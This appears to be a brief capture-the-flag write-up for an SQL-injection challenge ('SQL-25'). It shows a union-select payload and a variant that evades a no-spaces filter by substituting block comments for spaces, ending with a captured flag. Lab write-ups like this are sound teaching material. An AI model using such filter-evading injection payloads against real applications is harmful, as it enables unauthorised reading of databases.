<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
</head><body>SQL-25<br/>
https://sql-mayham.openctf.com/iouwoiuzxoipuzxciovpuuiopxvziooqlaoupsa/sql-25/<br/>
<br/>
Lets start by entering the same query from SQL-10<br/>
1 union select 1,2,3,max(id) FROM person;--<br/>
<img src="screenshot.png"/><br/>
<br/>
Hmm. Spaces aren't allowed. One way you can get away with spaces, but not actually put spaces is the comment command. There are two types, line and block. We don't want to comment the rest of the line so we need the block comment (/** comment goes here to include new line **/). Lets try it.<br/>
1/****/union/****/select/****/1,2,3,max(id)/****/FROM/****/person;--<br/>
<img src="screenshot 2.png"/><br/>
<br/>
Sweet, now lets try this one.<br/>
<img src="screenshot 3.png"/><br/>
Now we have another flag!</body></html>